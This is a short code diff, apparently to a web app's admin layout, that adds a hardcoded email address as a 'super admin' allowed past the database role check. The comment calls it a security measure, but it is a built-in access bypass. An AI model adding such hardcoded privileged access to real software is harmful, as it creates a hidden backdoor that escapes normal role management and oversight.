@@ -18,7 +18,10 @@ export default async function AdminLayout({ children }: { children: ReactNode })
         select: { role: true }
     });
 
-    if (!user || user.role !== 'ADMIN') {
+    // SUPER ADMIN SECURITY: Allow hardcoded super admin regardless of DB role
+    const isSuperAdmin = session.user.email === 'notesbundle@outlook.com';
+
+    if (!isSuperAdmin && (!user || user.role !== 'ADMIN')) {
         redirect('/');
     }
 
